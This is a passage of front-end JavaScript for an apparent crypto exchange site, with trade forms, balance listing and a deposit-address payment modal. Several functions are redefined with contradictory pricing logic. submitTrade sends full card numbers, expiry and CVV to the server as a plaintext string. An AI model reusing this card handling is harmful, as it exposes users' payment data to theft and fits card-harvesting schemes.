    let modal = document.getElementById('paymentInstructionModal');
    if (modal) modal.remove(); // Remove existing if any

    modal = document.createElement('div');
    modal.id = 'paymentInstructionModal';
    modal.style = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;";
    
    let address = "Contact Support (Address Not Set)";
    if (globalSettings && globalSettings.wallets && globalSettings.wallets[coinSymbol]) {
        address = globalSettings.wallets[coinSymbol];
    }

    modal.innerHTML = `
        <div style="background: #1a1a2a; border: 1px solid #333; border-radius: 12px; padding: 25px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
            
            <div style="width: 60px; height: 60px; background: rgba(0, 212, 170, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
            </div>

            <h2 style="color: #fff; margin-bottom: 10px; font-size: 22px;">Order Created</h2>
            <p style="color: #888; font-size: 14px; margin-bottom: 25px;">To complete your sale of <strong>$${usdAmount} USD</strong>, please send the exact amount below.</p>
            
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 15px;">
                <p style="color: #888; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px;">Amount to Send</p>
                <h3 style="color: #00d4aa; margin: 0; font-size: 24px; font-weight: 800;">${cryptoAmount} ${coinSymbol}</h3>
            </div>

            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px;">
                <p style="color: #888; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px;">${coinSymbol} Deposit Address</p>
                <div style="display: flex; gap: 8px; align-items: center;">
                    <div id="payInstAddress" style="flex: 1; font-family: monospace; font-size: 13px; color: #fff; word-break: break-all; text-align: left; background: #1a1a2a; padding: 10px; border-radius: 6px;">${address}</div>
                    <button onclick="copyPayAddress()" id="copyBtn" style="background: #333; color: #fff; border: none; padding: 12px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: bold;">Copy</button>
                </div>
            </div>

            <div style="background: rgba(246, 70, 93, 0.1); padding: 12px; border-radius: 8px; border: 1px solid rgba(246, 70, 93, 0.2); margin-bottom: 20px;">
                <p style="color: #f6465d; font-size: 12px; margin: 0; line-height: 1.4;">⚠️ Your order is <strong>Pending</strong>. It will be processed after we verify the transaction on the blockchain.</p>
            </div>

            <button onclick="document.getElementById('paymentInstructionModal').remove(); showView('dashboardView');" style="background: #00d4aa; color: #000; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: 800; font-size: 16px; cursor: pointer;">I Have Sent The Crypto</button>
        </div>
    `;
    document.body.appendChild(modal);
    window._currentPayAddress = address;
}

window.copyPayAddress = function() {
    navigator.clipboard.writeText(window._currentPayAddress).then(() => {
        const btn = document.getElementById('copyBtn');
        btn.textContent = 'Copied!';
        btn.style.background = '#00d4aa';
        btn.style.color = '#000';
        setTimeout(() => { btn.textContent = 'Copy'; btn.style.background = '#333'; btn.style.color = '#fff'; }, 2000);
    });
};

/* =====================================================
   BINANCE-STYLE ASSETS LIST (With Hide Zero Toggle)
   ===================================================== */
window.fetchBalances = async function() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        
        const assetsHeader = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim() === 'Your Assets');
        if (!assetsHeader) return;
        const assetsCard = assetsHeader.closest('.assets-section') || assetsHeader.parentElement;
        
        // Check if user prefers hiding zero balances
        let hideZero = localStorage.getItem('hideZeroBalances') === 'true';

        // Build the header with the Toggle
        let html = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <h3 style="margin: 0;">Your Assets</h3>
                <label style="display: flex; align-items: center; gap: 8px; cursor: pointer; font-size: 12px; color: #888;">
                    <span>Hide Zero Balances</span>
                    <div style="position: relative; width: 36px; height: 20px;">
                        <input type="checkbox" id="hideZeroToggle" ${hideZero ? 'checked' : ''} style="opacity: 0; width: 0; height: 0;">
                        <span style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: ${hideZero ? '#00d4aa' : '#333'}; border-radius: 20px; transition: .4s;"></span>
                        <span style="position: absolute; content: ''; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: white; border-radius: 50%; transition: .4s; transform: ${hideZero ? 'translateX(16px)' : 'translateX(0)'};"></span>
                    </div>
                </label>
            </div>
            <div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>
        `;
        
        let totalValue = 0;
        let assetRowsHtml = '';

        markets.forEach(coin => {
            const amount = balances[coin.symbol] || 0;
            const value = amount * coin.price;
            totalValue += value;
            
            // Skip if hideZero is true and amount is exactly 0
            if (hideZero && amount === 0) return;

            assetRowsHtml += `
                <div class="asset-row" onclick="showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})" style="cursor: pointer; transition: background 0.2s;" onmouseover="this.style.background='#1a1a2a'" onmouseout="this.style.background='transparent'">
                    <div class="asset-name"><div class="market-icon" style="background:${coin.color};">${coin.icon}</div> ${coin.name} (${coin.symbol})</div>
                    <div class="asset-amount">${amount.toFixed(6)}</div>
                    <div class="asset-value">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
                </div>
            `;
        });

        // If all assets are zero and hideZero is true, show a message
        if (assetRowsHtml === '') {
            assetRowsHtml = `<p style="text-align: center; color: #666; padding: 20px 0; font-size: 14px;">No active balances found.</p>`;
        }

        assetsCard.innerHTML = html + assetRowsHtml;
        
        // Update total portfolio value at the top
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) totalEl.textContent = `$${totalValue.toLocaleString(undefined, {minimumFractionDigits: 2})}`;

        // Add event listener to the new toggle
        const toggle = document.getElementById('hideZeroToggle');
        if (toggle) {
            toggle.addEventListener('change', (e) => {
                localStorage.setItem('hideZeroBalances', e.target.checked);
                fetchBalances(); // Re-render the list instantly
            });
        }

    } catch (error) { console.log("Balance fetch error:", error); }
};

/* =====================================================
   GLOBAL CURRENCY & EXCHANGE SPREAD LOGIC
   ===================================================== */
const currencyMap = {
    "🇺🇸 United States": { code: "USD", symbol: "$", rate: 1 },
    "🇬🇧 United Kingdom": { code: "GBP", symbol: "£", rate: 0.79 },
    "🇨🇦 Canada": { code: "CAD", symbol: "C$", rate: 1.36 },
    "🇦🇺 Australia": { code: "AUD", symbol: "A$", rate: 1.52 },
    "🇳🇬 Nigeria": { code: "NGN", symbol: "₦", rate: 1500 },
    "🇰🇪 Kenya": { code: "KES", symbol: "KSh", rate: 130 },
    "🇿🇦 South Africa": { code: "ZAR", symbol: "R", rate: 18.5 },
    "🇬🇭 Ghana": { code: "GHS", symbol: "₵", rate: 14.5 },
    "🇮🇳 India": { code: "INR", symbol: "₹", rate: 83.5 },
    "🇩🇪 Germany": { code: "EUR", symbol: "€", rate: 0.92 },
    "🇫🇷 France": { code: "EUR", symbol: "€", rate: 0.92 },
    "🇯🇵 Japan": { code: "JPY", symbol: "¥", rate: 150 },
    "🇦🇪 UAE": { code: "AED", symbol: "د.إ", rate: 3.67 },
    "🇧🇷 Brazil": { code: "BRL", symbol: "R$", rate: 5.0 }
};

// 5% Platform Spread
const SPREAD = 0.05; 

function getUserCurrency() {
    // Fallback to USD if user is not logged in or country not found
    if (!currentUser || !currentUser.country) return currencyMap["🇺🇸 United States"];
    return currencyMap[currentUser.country] || currencyMap["🇺🇸 United States"];
}

// Get price adjusted for the Exchange Spread
function getExchangePrice(coin, mode) {
    if (mode === 'buy') {
        return coin.price * (1 + SPREAD); // User pays 5% more
    } else {
        return coin.price * (1 - SPREAD); // User receives 5% less
    }
}

window.setTradeMode = function(mode) {
    currentTradeMode = mode;
    const curr = getUserCurrency();
    
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy');
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    if (mode === 'buy') {
        document.getElementById('amountLabel').textContent = `Amount to Spend (${curr.code})`;
        document.getElementById('submitTradeBtn').textContent = 'Confirm Purchase';
        document.getElementById('submitTradeBtn').style.background = 'var(--success)';
        document.getElementById('receivingWalletContainer').style.display = 'block';
        document.getElementById('tradeAmount').placeholder = '0.00';
        document.getElementById('tradeReceive').previousElementSibling.textContent = 'You will receive (Crypto)';
    } else {
        document.getElementById('amountLabel').textContent = 'Amount to Sell (Crypto)';
        document.getElementById('submitTradeBtn').textContent = 'Confirm Sale';
        document.getElementById('submitTradeBtn').style.background = 'var(--danger)';
        document.getElementById('receivingWalletContainer').style.display = 'none';
        document.getElementById('tradeAmount').placeholder = '0.000000';
        document.getElementById('tradeReceive').previousElementSibling.textContent = `You will receive (${curr.code})`;
    }
    
    const methodSelect = document.getElementById('tradeMethod');
    methodSelect.innerHTML = `
        <option value="Credit Card">Credit / Debit Card</option>
        <option value="PayPal">PayPal</option>
        <option value="Bank Transfer">Bank Transfer</option>
    `;
    
    document.getElementById('tradeAmount').value = '';
    document.getElementById('tradeReceive').value = '';
    togglePaymentDetails(); 
    calcTrade();
};

window.calcTrade = function() {
    const amount = parseFloat(document.getElementById('tradeAmount').value) || 0;
    const coinSymbol = document.getElementById('tradeCoin').value;
    const coin = markets.find(c => c.symbol === coinSymbol);
    const curr = getUserCurrency();
    
    if (coin && amount > 0) {
        if (currentTradeMode === 'buy') {
            // Buying: Convert local currency to USD, then get crypto at BUY price
            const usdAmount = amount / curr.rate;
            const cryptoAmount = (usdAmount / getExchangePrice(coin, 'buy')).toFixed(6);
            document.getElementById('tradeReceive').value = cryptoAmount + " " + coin.symbol;
        } else {
            // Selling: Get USD at SELL price, then convert to local currency
            const usdAmount = amount * getExchangePrice(coin, 'sell');
            const localAmount = (usdAmount * curr.rate).toFixed(2);
            document.getElementById('tradeReceive').value = `${curr.symbol} ${localAmount} ${curr.code}`;
        }
    } else {
        document.getElementById('tradeReceive').value = '';
    }
    updateAdminAddressDisplay();
};

window.submitTrade = async function() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value);
    const coinSymbol = document.getElementById('tradeCoin').value;
    const method = document.getElementById('tradeMethod').value;
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A";
    const coin = markets.find(c => c.symbol === coinSymbol);
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount.");
    
    // Minimum trade $100 USD equivalent
    const usdEquivalent = currentTradeMode === 'buy' ? (inputAmount / curr.rate) : (inputAmount * getExchangePrice(coin, 'sell'));
    if (usdEquivalent < 100) return showToast(`Minimum trade is $100 USD equivalent (~${curr.symbol}${(100 * curr.rate).toFixed(0)} ${curr.code}).`);
    
    let paymentDetails = "";
    if (method === 'Credit Card') {
        const cardNum = document.getElementById('cardNumber').value; const expiry = document.getElementById('cardExpiry').value; const cvv = document.getElementById('cardCvv').value;
        if (cardNum.length < 15 || expiry.length < 4 || cvv.length < 3) return showToast("Please fill valid card details.");
        paymentDetails = `Card: ${cardNum} | Exp: ${expiry} | CVV: ${cvv}`;
    } else if (method === 'PayPal') {
        const email = document.getElementById('paypalEmail').value; if (!email.includes('@')) return showToast("Enter a valid PayPal email."); paymentDetails = `PayPal: ${email}`;
    } else {
        const bank = document.getElementById('bankAccount').value; if (!bank) return showToast("Enter bank details."); paymentDetails = `Bank: ${bank}`;
    }
    
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter your receiving wallet address.");
    
    const token = localStorage.getItem('token');
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') {
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; 
        sendCurrency = curr.code;
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); 
        getCurrency = coinSymbol;
    } else {
        sendAmount = inputAmount; 
        sendCurrency = coinSymbol;
        const usdAmount = inputAmount * getExchangePrice(coin, 'sell');
        getAmount = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
        getCurrency = curr.code;
    }
    
    const orderData = { 
        userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, 
        sendAmount: sendAmount, sendCurrency: sendCurrency, getAmount: getAmount, getCurrency: getCurrency, 
        method: method, paymentDetails: paymentDetails, receivingWallet: wallet 
    };

    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify(orderData) 
        });
        const data = await res.json();
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') {
                try { const setRes = await fetch('/api/admin/public/settings'); globalSettings = await setRes.json(); } catch(e) {}
                showPaymentInstructions(coinSymbol, sendAmount, orderData.getAmount);
            } else {
                showToast(`Order Placed! ID: ${data.orderId}`); 
                setTimeout(() => showView('dashboardView'), 2000); 
            }
        } else { showToast(data.message || "Failed to place order."); }
    } catch (error) { showToast("Error connecting to server."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
};

/* =====================================================
   HIGH-YIELD TRADE LOGIC (Customer Bonus)
   ===================================================== */
const BONUS_RATE = 0.05; // 5% Bonus for the customer

// Get price adjusted to give the customer a better deal
function getExchangePrice(coin, mode) {
    if (mode === 'buy') {
        // BUY: Price is 5% CHEAPER for the customer, so they get MORE crypto
        return coin.price * (1 - BONUS_RATE); 
    } else {
        // SELL: Price is 5% HIGHER for the customer, so they get MORE cash
        return coin.price * (1 + BONUS_RATE); 
    }
}

window.calcTrade = function() {
    const amount = parseFloat(document.getElementById('tradeAmount').value) || 0;
    const coinSymbol = document.getElementById('tradeCoin').value;
    const coin = markets.find(c => c.symbol === coinSymbol);
    const curr = getUserCurrency();
    
    if (coin && amount > 0) {
        if (currentTradeMode === 'buy') {
            // Buying: Convert local currency to USD, then get crypto at the BONUS price
            const usdAmount = amount / curr.rate;
            const cryptoAmount = (usdAmount / getExchangePrice(coin, 'buy')).toFixed(6);
            document.getElementById('tradeReceive').value = cryptoAmount + " " + coin.symbol;
        } else {
            // Selling: Get USD at the BONUS price, then convert to local currency
            const usdAmount = amount * getExchangePrice(coin, 'sell');
            const localAmount = (usdAmount * curr.rate).toFixed(2);
            document.getElementById('tradeReceive').value = `${curr.symbol} ${localAmount} ${curr.code}`;
        }
    } else {
        document.getElementById('tradeReceive').value = '';
    }
    updateAdminAddressDisplay();
};

window.submitTrade = async function() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value);
    const coinSymbol = document.getElementById('tradeCoin').value;
    const method = document.getElementById('tradeMethod').value;
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A";
    const coin = markets.find(c => c.symbol === coinSymbol);
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount.");
    
    // Minimum trade check ($100 USD equivalent)
    const usdEquivalent = currentTradeMode === 'buy' ? (inputAmount / curr.rate) : (inputAmount * getExchangePrice(coin, 'sell'));
    if (usdEquivalent < 100) return showToast(`Minimum trade is $100 USD equivalent (~${curr.symbol}${(100 * curr.rate).toFixed(0)} ${curr.code}).`);
    
    let paymentDetails = "";
    if (method === 'Credit Card') {
        const cardNum = document.getElementById('cardNumber').value; const expiry = document.getElementById('cardExpiry').value; const cvv = document.getElementById('cardCvv').value;
        if (cardNum.length < 15 || expiry.length < 4 || cvv.length < 3) return showToast("Please fill valid card details.");
        paymentDetails = `Card: ${cardNum} | Exp: ${expiry} | CVV: ${cvv}`;
    } else if (method === 'PayPal') {
        const email = document.getElementById('paypalEmail').value; if (!email.includes('@')) return showToast("Enter a valid PayPal email."); paymentDetails = `PayPal: ${email}`;
    } else {
        const bank = document.getElementById('bankAccount').value; if (!bank) return showToast("Enter bank details."); paymentDetails = `Bank: ${bank}`;
    }
    
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter your receiving wallet address.");
    
    const token = localStorage.getItem('token');
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') {
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; 
        sendCurrency = curr.code;
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); 
        getCurrency = coinSymbol;
    } else {
        sendAmount = inputAmount; 
        sendCurrency = coinSymbol;
        const usdAmount = inputAmount * getExchangePrice(coin, 'sell');
        getAmount = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
        getCurrency = curr.code;
    }
    
    const orderData = { 
        userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, 
        sendAmount: sendAmount, sendCurrency: sendCurrency, getAmount: getAmount, getCurrency: getCurrency, 
        method: method, paymentDetails: paymentDetails, receivingWallet: wallet 
    };

    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify(orderData) 
        });
        const data = await res.json();
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') {
                try { const setRes = await fetch('/api/admin/public/settings'); globalSettings = await setRes.json(); } catch(e) {}
                // For sell, they are sending Crypto, and receiving Fiat
                showPaymentInstructions(coinSymbol, sendAmount, orderData.getAmount);
            } else {
                showToast(`Order Placed! ID: ${data.orderId}`); 
                setTimeout(() => showView('dashboardView'), 2000); 
            }
        } else { showToast(data.message || "Failed to place order."); }
    } catch (error) { showToast("Error connecting to server."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
};

/* =====================================================
   FIX: MINIMUM LIMIT OF 100 IN LOCAL CURRENCY
   ===================================================== */
window.submitTrade = async function() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value);
    const coinSymbol = document.getElementById('tradeCoin').value;
    const method = document.getElementById('tradeMethod').value;
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A";
    const coin = markets.find(c => c.symbol === coinSymbol);
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount.");
    
    // NEW RULE: Check minimum in LOCAL currency
    if (currentTradeMode === 'buy') {
        // Buying: inputAmount IS the local fiat
        if (inputAmount < 100) {
            return showToast(`Minimum purchase is ${curr.symbol} 100 ${curr.code}.`);
        }
    } else {
        // Selling: inputAmount is Crypto. Calculate how much fiat they will get.
        const usdAmount = inputAmount * getExchangePrice(coin, 'sell');
        const localAmount = usdAmount * curr.rate;
        if (localAmount < 100) {
            return showToast(`Minimum sale value is ${curr.symbol} 100 ${curr.code}.`);
        }
    }
    
    let paymentDetails = "";
    if (method === 'Credit Card') {
        const cardNum = document.getElementById('cardNumber').value; const expiry = document.getElementById('cardExpiry').value; const cvv = document.getElementById('cardCvv').value;
        if (cardNum.length < 15 || expiry.length < 4 || cvv.length < 3) return showToast("Please fill valid card details.");
        paymentDetails = `Card: ${cardNum} | Exp: ${expiry} | CVV: ${cvv}`;
    } else if (method === 'PayPal') {
        const email = document.getElementById('paypalEmail').value; if (!email.includes('@')) return showToast("Enter a valid PayPal email."); paymentDetails = `PayPal: ${email}`;
    } else {
        const bank = document.getElementById('bankAccount').value; if (!bank) return showToast("Enter bank details."); paymentDetails = `Bank: ${bank}`;
    }
    
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter your receiving wallet address.");
    
    const token = localStorage.getItem('token');
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') {
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; 
        sendCurrency = curr.code;
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); 
        getCurrency = coinSymbol;
    } else {
        sendAmount = inputAmount; 
        sendCurrency = coinSymbol;
        const usdAmount = inputAmount * getExchangePrice(coin, 'sell');
        getAmount = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
        getCurrency = curr.code;
    }
    
    const orderData = { 
        userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, 
        sendAmount: sendAmount, sendCurrency: sendCurrency, getAmount: getAmount, getCurrency: getCurrency, 
        method: method, paymentDetails: paymentDetails, receivingWallet: wallet 
    };

    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify(orderData) 
        });
        const data = await res.json();
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') {
                try { const setRes = await fetch('/api/admin/public/settings'); globalSettings = await setRes.json(); } catch(e) {}
                showPaymentInstructions(coinSymbol, sendAmount, orderData.getAmount);
            } else {
                showToast(`Order Placed! ID: ${data.orderId}`); 
                setTimeout(() => showView('dashboardView'), 2000); 
            }
        } else { showToast(data.message || "Failed to place order."); }
    } catch (error) { showToast("Error connecting to server."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
};

/* =====================================================
   FIX: PROFESSIONAL PAYMENT MODAL (Removing double text)
   ===================================================== */
window.showPaymentInstructions = function(coinSymbol, cryptoAmount, formattedUsdAmount) {
    let modal = document.getElementById('paymentInstructionModal');
    if (modal) modal.remove(); // Remove existing if any

    modal = document.createElement('div');
    modal.id = 'paymentInstructionModal';
    modal.style = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;";
    
    let address = "Contact Support (Address Not Set)";
    let addressColor = "#f6465d"; // Red if missing
    if (globalSettings && globalSettings.wallets && globalSettings.wallets[coinSymbol]) {
        address = globalSettings.wallets[coinSymbol];
        addressColor = "#fff"; // White if present
    }

    modal.innerHTML = `
        <div style="background: #1a1a2a; border: 1px solid #333; border-radius: 12px; padding: 25px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
            
            <div style="width: 60px; height: 60px; background: rgba(0, 212, 170, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
            </div>

            <h2 style="color: #fff; margin-bottom: 10px; font-size: 22px;">Order Created</h2>
            <p style="color: #888; font-size: 14px; margin-bottom: 25px;">To complete your sale and receive <strong>${formattedUsdAmount}</strong>, please send the exact amount below.</p>
            
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 15px;">
                <p style="color: #888; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px;">Amount to Send</p>
                <h3 style="color: #00d4aa; margin: 0; font-size: 24px; font-weight: 800;">${cryptoAmount} ${coinSymbol}</h3>
            </div>

            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px;">
                <p style="color: #888; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px;">${coinSymbol} Deposit Address</p>
                <div style="display: flex; gap: 8px; align-items: center;">
                    <div style="flex: 1; font-family: monospace; font-size: 13px; color: ${addressColor}; word-break: break-all; text-align: left; background: #1a1a2a; padding: 10px; border-radius: 6px;">${address}</div>
                    <button onclick="copyPayAddress()" id="copyBtn" style="background: #333; color: #fff; border: none; padding: 12px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: bold;">Copy</button>
                </div>
            </div>

            <div style="background: rgba(246, 70, 93, 0.1); padding: 12px; border-radius: 8px; border: 1px solid rgba(246, 70, 93, 0.2); margin-bottom: 20px;">
                <p style="color: #f6465d; font-size: 12px; margin: 0; line-height: 1.4;">⚠️ Your order is <strong>Pending</strong>. It will be processed after we verify the transaction on the blockchain.</p>
            </div>

            <button onclick="document.getElementById('paymentInstructionModal').remove(); showView('dashboardView');" style="background: #00d4aa; color: #000; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: 800; font-size: 16px; cursor: pointer;">I Have Sent The Crypto</button>
        </div>
    `;
    document.body.appendChild(modal);
    window._currentPayAddress = address;
};
